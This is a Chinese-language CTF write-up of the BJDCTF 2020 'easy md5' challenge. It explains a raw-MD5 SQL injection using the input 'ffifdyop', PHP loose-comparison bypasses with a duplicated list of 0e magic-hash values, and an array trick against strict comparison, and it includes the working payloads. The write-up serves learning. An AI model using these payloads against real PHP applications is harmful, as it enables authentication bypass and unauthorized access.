### buuoj_[BJDCTF 2020]easy md5

首先打开界面，随便输入一个数字，没反应，抓包看看，发送到repeater，看到有一行代码

```
Hint: select * from 'admin' where password=md5($pass,true)
```

> 这里，当md5函数指定了参数true的时候，返回的是16进制的，格式大概为'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c这样的字符串

所以上面的代码就可以等同于

```
select * from 'admin' where password=''or'6......'
```

显然的这是个永真式，所以需要找到这样一个password，使其加密之后的格式是'or'6开头的，找不到，尝试写个代码也没写出来。。。

看了大佬的wp，发现**ffifdyop**是可以的，输入后进入新页面

![](https://pic.imgdb.cn/item/610e8d405132923bf8e1cea3.jpg)

查看页面源代码获得

```
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

对于这种情况，暴力碰撞不太现实，考虑把a和b都弄成以0e开头，即作为科学计数法出现，0的任意次方都为0，可以绕过，而md5函数不可以处理数组，会返回NULL，此时NULL==NULL，也可以绕过

```undefined
一些以0e开头的值
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514

s1502113478a
0e861580163291561247404381396064

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s155964671a
0e342768416822451524974117254469

s1184209335a
0e072485820392773389523109082030

s1665632922a
0e731198061491163073197128363787

s1502113478a
0e861580163291561247404381396064

s1836677006a
0e481036490867661113260034900752

s1091221200a
0e940624217856561557816327384675

s155964671a
0e342768416822451524974117254469

s1502113478a
0e861580163291561247404381396064

s155964671a
0e342768416822451524974117254469

s1665632922a
0e731198061491163073197128363787

s155964671a
0e342768416822451524974117254469

s1091221200a
0e940624217856561557816327384675

s1836677006a
0e481036490867661113260034900752

s1885207154a
0e509367213418206700842008763514

s532378020a
0e220463095855511507588041205815

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s214587387a
0e848240448830537924465865611904

s1502113478a
0e861580163291561247404381396064

s1091221200a
0e940624217856561557816327384675

s1665632922a
0e731198061491163073197128363787

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s1665632922a
0e731198061491163073197128363787

s878926199a
0e545993274517709034328855841020
```

所以构造playload

```
?a=QNKCDZO&b=s878926199a
```

然后又获得代码

```
<?php
error_reporting(0);
include"flag.php";

highlight_file(__FILE__);
if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){  		echo $flag;
} 
```

这个和刚刚的差不多，不过这里是三个等于号是强比较，所以采用数组方式

![](https://pic.imgdb.cn/item/610e8f765132923bf8e506bb.jpg)